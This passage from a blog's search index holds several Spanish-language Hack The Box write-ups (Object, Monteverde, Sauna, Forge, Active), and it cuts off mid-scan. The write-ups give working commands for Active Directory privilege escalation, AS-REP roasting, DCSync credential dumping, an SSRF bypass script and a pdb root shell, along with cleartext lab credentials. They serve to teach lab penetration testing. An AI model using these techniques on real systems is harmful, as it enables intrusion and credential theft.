oliver.oliver:c1cdfun_d2434Con estas credenciales ya podemos ingresar utilizando Evil-WinRM.Para enumerar el sistema y descubrir una manera de escalar privlegios, utilizaremos BloodHound, pero primero debemos extraer la información desde la máquina. Para ello Sharphound en su versión de PowerShell viene de maravilla. Al momento de escribir este post, la versión de PowerShell de BloodHound no se encuentra disponible en su repositorio original, pero puede ser encontrada en los commits anteriores.Subiremos el archivo con el comando upload nativo de Evil-WinRM, importaremos el módulo y lo ejecutaremos llamándo a la función Invoke-BloodHound -CollectionMethod All. Generará un archivo comprimido con toda la data recolectada.Descargaremos el comprimido y lo importaremos a BloodHound para analizarlo.BloodHoundUna vez que ya se encuentra importado nuestro .zip, lo primero será marcar Oliver como Owned.Posteriormente utilizaremos una de las consultas pre-construidas que contiene BloodHound: Find Shortest Paths to Domain Admins. Esto básicamente lo que hará será analizar posibles rutas para escalar privlegios y convertirnos en Domain Admin en base a la información obtenida del sistema.Como se puede apreciar, nos entrega una ruta bastante directa en donde tendremos que pivotear a través de los usuarios smith y maria antes de llegar a Administrador de Dominio.Consola como SmithLa gráfica nos indica que para convertirnos en el usuario smith podemos abusar del permiso ForceChangePassword. Para hacerlo, solamente debemos de ejecutar un simple comando, desde PowerShell sería de la siguiente manera:Set-ADAccountPassword -Identity smith -Reset -NewPassword (ConvertTo-SecureString -AsPlainText &quot;cerv123!&quot; -Force)Esto seteará la contraseña del usuario smith a cerv123!, lo que nos permitirá ingresar con estas credenciales a través de WinRM.Consola como MariaLogon scriptAhora que tenemos acceso desde el usuario smith, lo siguiente que debemos hacer es buscar la forma de utilizar GenericWrite. Nota: BloodHound tiene integrado un panel de ayuda en donde se detalla como abusar de cada ACL, pero en este caso no nos será de utilidad.Si revisamos en HackTricks veremos que hay una sección en donde se indica que es posible utilizar GenericWrite para insertar un logon script, el cual se ejecutará en cada inicio de sesión del usuario. Esto normalmente no funcionaría en un CTF, ya que se requiere que el usuario inicie sesión antes de que se ejecute nuestro script, pero en esta ocasión es distinto, ya que el usuario Maria se encuentra constantemente logueando el sistema.Al revisar la información extraída con SharpHound se puede identificar que el último cambio de contraseña del user fué el 22 de Octubre de 2021, pero el último inicio de sesión data del 11 de Marzo 2022 (fecha actual al momento de escribir este writeup).Ahora que sabemos que este método es posible, desde el panel de ayuda de BloodHound podemos obtener el comando a ejecutar (con unas pequeñas modificaciones) para insertar nuestro script. Set-DomainObject -Identity [USER] -SET @{scriptpath=&#39;[SCRIPT-PATH]&#39;}Verificamos que el usuario maria no posee ningún Logon Script configurado.Crearemos nuestro script bajo el directorio Temp para no tener problemas de permisos y le insertaremos el siguiente contenido:dir C:\\Users\\maria\\Desktop &amp;gt; C:\\Temp\\Scripts\\out.txtEsto nos proporcionará una vía para leer directorios del usuario María, ya que no tenemos la capacidad de cambiar su contraseña o levantar una reverse shell debido a la restricciones de Firewall.Pero antes, deberemos importar PowerView.ps1 ya que de otra manera no nos interpretará el comando. Entonces, los pasos a seguir serán: Subir script PowerView.ps1. Importar su contenido. Ejecutar el comando de PowerShell.Set-ADObject -SamAccountName maria -PropertyName scriptpath -PropertyValue &quot;C:\\Temp\\Scripts\\pwn.ps1&quot; Verificaremos que se agregó correctamente.Enumeración de directorioAl cabo de unos segundos veremos el archivo out.txt con el output del comando dir C:\\Users\\maria\\Desktop.Vemos el archivo Engines.xls, la idea será traerlo a nuestra máquina para inspeccionarlo. Para esto podemos convertirlo a base64 y extraerlo, o bien, copiarlo a nuestra carpeta temporal y luego descargarlo.CredencialesAbremos el archivo y veremos tres posibles credenciales.Luego de validar las contraseñas contra WinRM, verificamos que W3llcr4ft3d_4cls es la correcta para maria.Domain AdminYa que tenemos acceso como maria, sólo restaría abusar del ACL WriteOwner para obtener Domain Admin.Volveremos al directorio temporal creado anteriormente y haremos lo siguiente: Importar nuevamente PowerView.ps1.Import-Module .\\PowerView.ps1 Setear maria como propietario del grupo Domain Admins.Set-DomainObjectOwner -Identity &quot;Domain Admins&quot; -OwnerIdentity maria Garantizar todos los permisos a maria dentro del grupo Domain Admins.Add-DomainObjectAcl -PrincipalIdentity maria -TargetIdentity &quot;Domain Admins&quot; -Rights All Finalmente agregar a maria dentro del grupo Domain Admins.net group &quot;Domain Admins&quot; maria /add /domainYa en este punto tendríamos los privlegios máximos y estaría rooteada la máquina. Nota: Recordar que es necesario reiniciar la sesión para que se apliquen los nuevos permisos.Como último paso buscaremos las flags.Get-ChildItem -Path C:\\Users -Recurse -Include root.txt,user.txt | select FullnameEsto sería todo para Object. ¡Happy Hacking and keep grinding!" }, { "title": "Monteverde Writeup [ES] - HackTheBox", "url": "/Monteverde-Writeup-HackTheBox/", "categories": "HTB", "tags": "easy, windows, active-directory, azure", "date": "2022-02-16 13:00:00 -0300", "snippet": "ResumenMonteverde es una máquina Windows de dificultad media de la plataforma de Hack The Box, incluye conceptos de explotación de Azure AD Sync y enumeración básica.Se iniciará obteniendo información desde el servicio RPC para enumerar los usuarios del sistema, con los cuales es posible obtener credenciales válidas haciendo un password spray con CrackMapExec. Posteriormente se escalará a un usuario con mayores privilegios al descubrir credenciales en un archivo .xml. Desde aquí se podrá elevar a privilegios de Administrador explotando Azure AD Sync.EnumeraciónRustscan - NMAPComo siempre, se iniciará realizando un escaneo general de los 65535 puertos. En este caso se utilizará Rustscan, proporcionando comandos de nmap para realizar el escaneo desde un one-liner. rustscan 10.10.10.172 -- -sC -sV | tee services.nmap.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;Faster Nmap scanning with Rust.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------Nmap? More like slowmap.🐢[~] The config file is expected to be at &quot;/home/rustscan/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#39;-b 1048476&#39;.Open 10.10.10.172:53Open 10.10.10.172:88Open 10.10.10.172:135Open 10.10.10.172:139Open 10.10.10.172:389Open 10.10.10.172:445Open 10.10.10.172:464Open 10.10.10.172:593Open 10.10.10.172:636Open 10.10.10.172:3268Open 10.10.10.172:3269Open 10.10.10.172:5985Open 10.10.10.172:9389Open 10.10.10.172:49667Open 10.10.10.172:49673Open 10.10.10.172:49674Open 10.10.10.172:49676Open 10.10.10.172:49696Open 10.10.10.172:49962Desde el output podemos obtener que los servicios: LDAP, RPC, SMB, WinRM y Kerberos se encuentran abiertos, los cuales son ideales para comenzar la enumeración.SMBComenzando con el servicio SMB, se intenta enumerar información adicional con una autenticación de usuario y contraseña null.No es posible enumerar recursos compartidos sin credenciales válidas, pero se obtiene el dominio: MEGABANK.LOCAL.RPCCon la ayuda de rpcclient, podemos listar información sin necesidad de autenticación. En este caso enumeraremos los usuarios con enumdomusers.Y filtraremos el resultado para guardar los usuarios en el archivo users.txtrpcclient -U &#39;&#39; 10.10.10.172 -N -c &#39;enumdomusers&#39; | grep -oP &#39;\\[.*?\\]&#39; | grep -v &#39;0x&#39; | tr -d &#39;[]&#39; &amp;gt; users.txt users.txtUsuario - SABatchJobsYa en tenencia de usuarios válidos del sistema, lo primero que se intenta es un ataque asreproast. Se ejecuta con las herramientas crackmapexec y GetNPUsers respectivamente.Al no tener éxito con este método, y como buena práctica, podríamos realizar un password spraying con los usernames obtenidos anteriormente, de tal manera de utilizar cada username como usuario y contraseña en cada combinación.cme smb 10.10.10.172 -u users.txt -p users.txtSABatchJobs:SABatchJobsUsuario - mhopeAhora que poseemos credenciales, intentamos nuevamente listar recursos compartidos por SMB. Se identifican dos directorios interesantes: azure_uploads y users$.Entramos a azure_uploads y se observa vacío.En el caso del recurso users$ vemos directorios para cuatro usuarios.En lugar de revisar cada uno desde smbmap u otra herramienta, haremos una montura de todo users$ en nuestra máquina local. Posteriormente listaremos todo el contenido de manera recursiva con tree.mount -t cifs -o username=&#39;SABatchJobs&#39;,password=&#39;SABatchJobs&#39; //10.10.10.172/users$ /mnt/monteverdeDentro del directorio mhope se encuentra el archivo azure.xml que contiene una contraseña en texto claro. azure.xml&amp;lt;Objs Version=&quot;1.1.0.1&quot; xmlns=&quot;http://schemas.microsoft.com/powershell/2004/04&quot;&amp;gt; &amp;lt;Obj RefId=&quot;0&quot;&amp;gt; &amp;lt;TN RefId=&quot;0&quot;&amp;gt; &amp;lt;T&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/T&amp;gt; &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt; &amp;lt;/TN&amp;gt; &amp;lt;ToString&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/ToString&amp;gt; &amp;lt;Props&amp;gt; &amp;lt;DT N=&quot;StartDate&quot;&amp;gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt; &amp;lt;DT N=&quot;EndDate&quot;&amp;gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt; &amp;lt;G N=&quot;KeyId&quot;&amp;gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt; &amp;lt;S N=&quot;Password&quot;&amp;gt;4n0therD4y@n0th3r$&amp;lt;/S&amp;gt; &amp;lt;/Props&amp;gt; &amp;lt;/Obj&amp;gt;&amp;lt;/Objs&amp;gt;mhope:4n0therD4y@n0th3r$AdministratorUna vez logueados como el usuario mhope descubrimos que pertenece al grupo Azure Admins.Adicionalmente, se detecta el servicio ADSync ejecutándose en la máquina.Azure AD SyncEfectuando una búsqueda rápida en internet, encontramos un post en donde se detalla un método de abusar el servicio Azure AD Sync para obtener credenciales de ciertos usuarios. Todo lo necesario se encuentra en el repositorio de github, en donde deberemos descargar AdDecrypt.zip y subir su contenido a la máquina víctima.Posteriormente se debe ir al directorio C:\\Program Files\\Microsoft Azure AD Sync\\Bin y ejecutar AdDecrypt.exe:C:\\Users\\mhope\\Documents\\my_files\\AdDecrypt.exe -FullSQLInmediatemente obtendremos las credenciales del usuario Administrator.Y como último paso, entraremos por WinRM y listaremos las flags para ingresarlas en la plataforma.Esto sería todo para Monteverde. ¡Happy Hacking and keep grinding!Más información https://blog.xpnsec.com/azuread-connect-for-redteam/ Ippsec - https://www.youtube.com/watch?v=HTJjPZvOtJ4 S4vitaar - https://www.youtube.com/watch?v=eY8Sk4pnvOI" }, { "title": "Sauna Writeup [ES] - HackTheBox", "url": "/Sauna-Writeup-HackTheBox/", "categories": "HTB", "tags": "easy, windows, active-directory, kerberoasting, asreproast", "date": "2022-02-05 13:00:00 -0300", "snippet": "ResumenSauna es una máquina Windows de dificultad fácil de la plataforma de Hack The Box, incluye conceptos de explotación de Active Directory y enumeración básica.Comenzaremos por encontrar usuarios potenciales a través de enumeración LDAP y WEB. Con estos, se aplicará una validación de usuarios contra kerberos para descartar los que no resulten válidos y realizar asreproast para obtener un hash, crackearlo y posteriormente obtener una consola como un usuario de bajos privlegios. Dentro del sistema, será posible enumerar y encontrar credenciales autologon para otro usuario y pivotar a él. Este usuario tendrá privilegios para ejecutar un ataque DCSync y obtener el hash del usuario Administrador, con el que será posible ingresar directamente utilizando WinRM.EnumeraciónRustscan - NMAPComo siempre, se iniciará realizando un escaneo general de los 65535 puertos. En este caso se utilizará Rustscan, proporcionando comandos de nmap para realizar el escaneo desde un one-liner. rustscan 10.10.10.100 -- -sC -sV | tee services.nmap.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;Faster Nmap scanning with Rust.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------🌍HACK THE PLANET🌍[~] The config file is expected to be at &quot;/home/rustscan/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#39;-b 1048476&#39;.Open 10.10.10.175:53Open 10.10.10.175:80Open 10.10.10.175:88Open 10.10.10.175:135Open 10.10.10.175:139Open 10.10.10.175:389Open 10.10.10.175:445Open 10.10.10.175:464Open 10.10.10.175:593Open 10.10.10.175:636Open 10.10.10.175:3268Open 10.10.10.175:3269Open 10.10.10.175:5985Open 10.10.10.175:9389Open 10.10.10.175:49667Open 10.10.10.175:49673Open 10.10.10.175:49674Open 10.10.10.175:49676Open 10.10.10.175:49695(...)PORT STATE SERVICE REASON VERSION53/tcp open domain? syn-ack| fingerprint-strings:| DNSVersionBindReqTCP:| version|_ bind80/tcp open http syn-ack Microsoft IIS httpd 10.0| http-methods:| Supported Methods: OPTIONS TRACE GET HEAD POST|_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/10.0|_http-title: Egotistical Bank :: Home88/tcp open kerberos-sec syn-ack Microsoft Windows Kerberos (server time: 2022-01-21 07:27:16Z)135/tcp open msrpc syn-ack Microsoft Windows RPC139/tcp open netbios-ssn syn-ack Microsoft Windows netbios-ssn389/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)445/tcp open microsoft-ds? syn-ack464/tcp open kpasswd5? syn-ack593/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped syn-ack3268/tcp open ldap syn-ack Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)3269/tcp open tcpwrapped syn-ack5985/tcp open http syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf syn-ack .NET Message Framing49667/tcp open msrpc syn-ack Microsoft Windows RPC49673/tcp open ncacn_http syn-ack Microsoft Windows RPC over HTTP 1.049674/tcp open msrpc syn-ack Microsoft Windows RPC49676/tcp open msrpc syn-ack Microsoft Windows RPC49695/tcp open msrpc syn-ack Microsoft Windows RPCDesde el output podemos obtener que los servicios: LDAP, RPC, HTTP, SMB, WinRM y Kerberos se encuentran abiertos, los cuales son ideales para comenzar la enumeración. Adicionalmente Nmap nos indica que el dominio al cual pertenece la máquina es: EGOTISTICAL-BANK.LOCAL.SMBComenzando con el servicio SMB, se intenta enumerar información adicional con una autenticación de usuario null.Como era de esperar, no es posible enumerar recursos compartidos sin credenciales válidas.RPCSe intenta lo mismo con RPC sin tener éxito.LDAPYa que aún no disponemos de credenciales dentro de la máquina, lo que se puede hacer es lanzar un script de enumeración de nmap para intentar obtener algo de información.nmap -n -sV --script &quot;ldap* and not brute&quot; 10.10.10.175Con este método se identifica el usuario Hugo Smith como un usuario válido del sistema.Enumeración WebCon respecto al puerto 80, lo primero que se visualiza al entrar es una presunta landpage de un banco llamado Egotistical BankHusmeando por la web, llegamos a la ruta /about en donde hay nombres de “colaboradores”, los cuales son usuarios potenciales del sistema.Se obtienen los siguientes nombres: Fergus Smith Hugo Bear Steven Kerb Shaun Coins Bowie Taylor Sophie DriverEn este punto, podemos utilizar la herramienta Kerbrute para validar estos usuarios. Pero antes de esto, sería importante saber en qué formato están creados los usuarios dentro del dominio, es decir, su samAccountName o nombre de login. Tomaremos como ejemplo el primer usuario obtenido, Hugo Smith e intentaremos distintos formatos para conocer la estructura.Ejecutaremos kerbrute con la siguiente lista de usuarios para conocer el formato.hugo_smithhugo.smithhugosmithhugo-smithhsmithkerbrute userenum users.txt --dc 10.10.10.175 -d EGOTISTICAL-BANK.LOCALY tenemos un match con el usuario hsmith, con esto ya podemos construir la lista con el resto de nombres.hsmithfsmithhbearskerbscoinsbtaylorsdriverASREPRoastCon la información obtenida, se podría intentar un ataque de tipo AS-REP Roast, el cual consiste en abusar del atributo DONT_REQ_PREAUTH en la configuración del usuario, de esta forma obtendremos un TGT o hash que es posible crackear de manera offline con john the ripper o hashcat. FuentePara realizar este ataque existen varias opciones, en este caso estaremos utilizando GetNPUsers.py de Impacket y el módulo ASREPROAST de CrackMapExec.GetNPUsers GetNPUsers.py -usersfile users.txt -no-pass -request EGOTISTICAL-BANK.LOCAL/ -dc-ip 10.10.10.175CrackmapExec cme ldap 10.10.10.175 -u users.txt -p &#39;&#39; --asreproast hashes.txt --kdcHost 10.10.10.175De todos los usuarios en la lista, solo el user fsmith es vulnerable a asreproast y se obtiene su hash.Ganando Acceso - user fsmithAmbos hashes serán válidos y podrán ser crackeados por ambas herramientas mencionadas anteriormente. En esta ocasión utilizaremos hashcat.Para descubrir que módo se debe utilizar, podemos listar los hashes de ejemplo con --example-hashes y filtrar por la cadena de inicio del hash.Ahora, consultando el panel de ayuda hashcat -h vemos un ejemplo de ejecución utilizando un wordlist.Entonces tendríamos lo siguiente: hashcat -a 0 -m 18200 hashes.txt /usr/share/wordlists/rockyou.txtSe consigue la contraseña Thestrokes23. Inmeditanamente la validamos contra el servicio WinRM y tenemos acceso.Escalando privilegios - user svc_loanmgrYa una vez dentro de Sauna, procederemos a realizar enumeración básica y con net users se descubre un nuevo usuario: svc_loanmgr.Esto también puede ser enumerado con la ayuda de CrackMapExec haciendo un bruteforcing de usuarios en base a su RID.Continuando, pasamos a buscar credenciales que pudieran estar guardadas en el registro, es decir, contraseñas autologon. Esto se puede realizar con una query desde consola o bien utilizando winPEAS. reg query &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon&quot;Se obtiene la contraseña para el usuario svc_loanmgr. Al chequear las credenciales contra el servicio WinRM, vemos que también se encuentra en el grupo Remote Management Users.Escalando privilegios - rootAhora que tenemos acceso al user svc_loanmgr aplicaremos un reconocimiento con la ayuda de bloodhound. Para esta ocasión se utilizará la versión en python que se puede lanzar remotamente.Bloodhound bloodhound-python -u &#39;svc_loanmgr&#39; -p &#39;Moneymakestheworldgoround!&#39; -d EGOTISTICAL-BANK.LOCAL -ns 10.10.10.175 -c allSe obtienen cuatro archivos con la información extraída y procederemos a subirlos a BloodHound Información adicional sobre bloodhound: HacktricksUna vez la data ha sido importada, buscaremos entidades con permisos para ejecutar un ataque DCSync. Más información sobre DCSync y su explotación: HackTricksDesde la pestaña Analysis seleccionaremos Find Principals with DCSync Rights, esto automáticamente nos dará una lista de los usuarios/grupos que tengan los permisos necesarios para aplicar el ataque.El user svc_loanmgr posee los permisos GetChanges y GetChangesAll.DCSyncSecretsdumpCon esta información, ya se puede realizar el DCSync remotamente utilizando secretsdump.py de impacket. secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr@10.10.10.175MimikatzOtra forma de aplicar DCSync (localmente), sería subir a la máquina el binario de mimikatz.exe y ejecutar la siguiente instrucción. .\\mimikatz.exe &#39;lsadump::dcsync /domain:egotistical-bank.local /user:Administrator&#39; exitCon el hash del usuario Administrador obtenido, intentaremos ingresar por WinRM directamente, ya que no es necesario crackearlo.Por último, listaremos las flags. ¡Happy Hacking and keep grinding!" }, { "title": "Forge Writeup [ES] - HackTheBox", "url": "/Forge-Writeup-HackTheBox/", "categories": "HTB", "tags": "medium, linux, web, ssrf", "date": "2022-01-22 16:00:00 -0300", "snippet": "Forge es una máquina Linux de dificultad media ofrecida por la plataforma de Hack The Box. Esta es una de las primeras máquinas que tuve el agrado de resolver cuando aún estaba Activa en la plataforma.ResumenForge es una máquina que no consideraría difícil de resolver, es muy intuitiva siempre y cuando se preste atención a las pequeñas pistas. Primero nos encontraremos con un sitio web que permite subir imágenes con dos métodos, desde un archivo local y desde una URL remota. Esta última se puede explotar a través de SSRF para acceder a un subdominio que resulta estar bloqueado desde nuestra máquina de atacante. Al consultar este subdominio se nos entrega información adicional para acceder a un FTP junto con sus credenciales, esto nos llevará a descubrir una llave privada SSH para ingresar a Forge con un usuario de bajos privilegios.Una vez dentro de la máquina, descubriremos unos permisos especiales que permiten ejecutar un script de python como el usuario root. Al cabo de un pequeño análisis del script se detecta una librería inusual que permitirá obtener una consola como root.EnumeraciónRustscan / NMAPComo siempre, se iniciará realizando un escaneo general de los 65535 puertos. rustscan 10.10.11.111 -- -sC -sV | tee services.nmap.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;Faster Nmap scanning with Rust.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------😵 https://admin.tryhackme.com[~] The config file is expected to be at &quot;/home/rustscan/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#39;-b 1048476&#39;.Open 10.10.11.111:22Open 10.10.11.111:80(...)PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open http syn-ack Apache httpd 2.4.41| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://forge.htbService Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernelEn este caso solo vemos los puertos 22 y 80 abiertos.Enumeración webIniciando con whatweb se detecta que la página web redirecciona hacia el nombre DNS forge.htb.Sabiendo esto, lo agregaremos a /etc/hosts e intentaremos de nuevo.En su index se encuentra una galería de imágenes y un enlace en la esquina superior izquierda etiquetado como Upload an image.Intentamos subir una imagen desde el dispositivo local. Esto inicialmente dió la impresión de que se traba de una vulnerabilidad de tipo Unrestricted file upload pero luego de una serie de pruebas se comprobó que no era el caso.El enlace que entrega la web lleva a la ruta donde se almacena dicho archivo, en donde no se puede hacer mucho más.Ahora utilizando el método Upload from url testearemos como se comporta y si es posible explotarlo. Para esta prueba, levantaremos un servidor web con php para exponer el archivo info.php y consultarlo desde forge.htbAl igual que con el otro método, se genera una URL en donde se puede acceder al recurso.Al abrirlo, descubrimos que el archivo existe pero no muestra ningún contenido. Sin embargo, al realizar un curl, vemos el phpinfo. Lo interesante de esto es que no se interpreta el código en la máquina Forge, por lo tanto no funcionará como RFI, pero si que permite leer la data de una URL dada.Continuando con la enumeración, se intenta aplicar un fuzzing de directorios con gobuster el cual no arroja nuevos directorios.Para el caso de la enumeración de subdominios utilizaremos wfuzz y esta vez si obtenemos resultados positivos. admin.forge.htbLo consultamos y vemos un texto que nos indica que el recurso es accesible solo de manera local.Server-side request forgery (SSRF)Ahora que sabemos que admin.forge.htb solo se puede acceder localmente y tenemos una vía potencial de “leer” URL con la herramienta upload, intentaremos consultar este recurso y obtener información.Y la web nos indica que existe una especie de lista negra que no permite consultar el subdominio admin.Luego de unos intentos es posible hacer un bypass de la blacklist al ingresar el nombre con mayúsculas.Nuevamente, realizamos una petición GET a la URL con curl y vemos información interesante.Se obtienen dos nuevos endpoint: admin.forge.htb/announcement. admin.forge.htb/upload.Se realiza una consulta hacia: admin.forge.htb/announcement.Esta página nos indica lo siguiente: Existe un ftp interno que se puede acceder con las credenciales: user:heightofsecurity123!. El endpoint admin.forge.htb/upload se puede consultar vía GET con el parámetro u como argumento y es más permisivo que el anterior, ya que permite contenido desde ftp y ftps.Esto nos da una idea bastante clara de lo que se debe hacer a continuación, pero antes, para facilitar la construcción del SSRF, utilizaré un script en python3 que hará todo el proceso más fácil.Este script automatizará la consulta de la URL que se le pase como argumento, obtendrá el enlace que se genera automáticamente y lo consultará para leer su contenido.#!/usr/bin/python3import requests, argparsefrom bs4 import BeautifulSoupparser = argparse.ArgumentParser( description=&quot;Forge upload script - HTB&quot;)parser.add_argument(&quot;url&quot;, help=&quot;Please provide an URL&quot;)args = parser.parse_args()post_url = &quot;http://forge.htb/upload&quot;post_data={ &#39;url&#39;: args.url, &#39;remote&#39;: &quot;1&quot;}p = requests.post(post_url, data=post_data)soup = BeautifulSoup(p.text, &#39;html.parser&#39;)link = soup.findAll(&quot;a&quot;)[2].textprint(&quot;-&quot;*len(link))print(link)print(&quot;-&quot;*len(link))g = requests.get(link)print(g.text)Acceso inicialCon toda la información que tenemos, la idea es construir una cadena que haga un GET a admin.forge.htb/upload y le pase como parámetro una string de conexión al ftp local.Las autenticación al ftp se puede incluir en la misma URL siguiendo esta estructura:ftp://&amp;lt;username&amp;gt;:&amp;lt;password&amp;gt;@&amp;lt;host&amp;gt;&amp;lt;path&amp;gt; python3 upload.py &#39;http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@ADMIN.FORGE.HTB/&#39;Una vez ejecutado el script con nuestra cadena especialmente diseñada, vemos lo que parece ser el home del usuario user, ya que se encuentra la flag user.txt dentro de este directorio.Sin mucho más explorar dentro de este ftp, intenté ingresar por ssh con las credenciales obtenidas para recibir el siguiente mensaje: user@forge.htb: Permission denied (publickey). Esto nos indica que ha sido deshabilitada la autenticación por contraseña para este usuario, por lo tanto, la opción sería ingresar mediante una llave id_rsa.Volviendo al ftp y considerando que no hay otros directorios de interés que sean visibles, podemos suponer que existe el directorio .ssh y por ende, una id_rsa dentro de él. python3 upload.py &#39;http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@ADMIN.FORGE.HTB/.ssh/id_rsa&#39;Efectivamente existe una llave para la conexión por ssh sin proporcionar contraseña. ssh -i id_rsa user@forge.htbEscalada de privilegiosUna vez dentro, listando los permisos nos encontramos con el script /opt/remote-manage.py que nuestro usuario puede ejecutar como root.#!/usr/bin/env python3import socketimport randomimport subprocessimport pdbport = random.randint(1025, 65535)try: sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sock.bind((&#39;127.0.0.1&#39;, port)) sock.listen(1) print(f&#39;Listening on localhost:{port}&#39;) (clientsock, addr) = sock.accept() clientsock.send(b&#39;Enter the secret passsword: &#39;) if clientsock.recv(1024).strip().decode() != &#39;secretadminpassword&#39;: clientsock.send(b&#39;Wrong password!\\n&#39;) else: clientsock.send(b&#39;Welcome admin!\\n&#39;) while True: clientsock.send(b&#39;\\nWhat do you wanna do: \\n&#39;) clientsock.send(b&#39;[1] View processes\\n&#39;) clientsock.send(b&#39;[2] View free memory\\n&#39;) clientsock.send(b&#39;[3] View listening sockets\\n&#39;) clientsock.send(b&#39;[4] Quit\\n&#39;) option = int(clientsock.recv(1024).strip()) if option == 1: clientsock.send(subprocess.getoutput(&#39;ps aux&#39;).encode()) elif option == 2: clientsock.send(subprocess.getoutput(&#39;df&#39;).encode()) elif option == 3: clientsock.send(subprocess.getoutput(&#39;ss -lnt&#39;).encode()) elif option == 4: clientsock.send(b&#39;Bye\\n&#39;) breakexcept Exception as e: print(e) pdb.post_mortem(e.__traceback__)finally: quit()Por lo que se puede ver en el código, existe una porción en donde posterior a una excepción, se gatilla la ejecución de pdb. Sabiendo que el script se ejecuta como el usuario root, esto se puede explotar para lanzar una consola bajo ese contexto privilegiado.Lo primero que haremos será lanzar dos terminales de SSH con el usuario user y correr el script en una sesión y conectar desde la otra. La contraseña para la conexión puede ser encontrada dentro del código: secretadminpassword.En este punto ya es posible forzar un error en la ejecución. Desde el cliente se envía una respuesta de tipo string. El server arroja un error ya que se esperaba un int. Tal como se había visto en el código, posterior a una excepción, se lanza una consola de pdb.Ya solo bastaría lanzar una shell como se haría comunmente en python. import os; os.system(&quot;/bin/bash&quot;)Y eso sería todo para la máquina Forge. ¡Happy Hacking and keep grinding!" }, { "title": "Active Writeup [ES] - HackTheBox", "url": "/Active-Writeup-HackTheBox/", "categories": "HTB", "tags": "easy, windows, active-directory, kerberoasting", "date": "2022-01-19 22:00:00 -0300", "snippet": "Active es una máquina Windows de dificultad fácil ofrecida por la plataforma de Hack The Box. A lo largo de este post encontrarás un paso a paso de su resolución.ResumenEsta máquina trata conceptos de enumeración de Active Directory, recursos compartidos y autenticación. Primero nos encontraremos con un directorio que podemos acceder a través de SMB utilizando un null session, posteriormente obtendremos credenciales desde un archivo encontrado en este directorio y utilizaremos esas credenciales para realizar un Kerberoasting y obtener el hash del usuario Administrator.EnumeraciónRustscan - NMAPComo siempre, se iniciará realizando un escaneo general de los 65535 puertos. En este caso se utilizará Rustscan, proporcionando comandos de nmap para realizar el escaneo desde un one-liner. rustscan 10.10.10.100 -- -sC -sV | tee ports-rustcan.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;Faster Nmap scanning with Rust.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------🌍HACK THE PLANET🌍[~] The config file is expected to be at &quot;/home/rustscan/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#39;-b 1048476&#39;.Open 10.10.10.100:53Open 10.10.10.100:88Open 10.10.10.100:135Open 10.10.10.100:139Open 10.10.10.100:389Open 10.10.10.100:593Open 10.10.10.100:3268Open 10.10.10.100:3269Open 10.10.10.100:5722Open 10.10.10.100:9389Open 10.10.10.100:47001Open 10.10.10.100:49152Open 10.10.10.100:49153Open 10.10.10.100:49154Open 10.10.10.100:49155Open 10.10.10.100:49157Open 10.10.10.100:49158Open 10.10.10.100:49165Open 10.10.10.100:49170Open 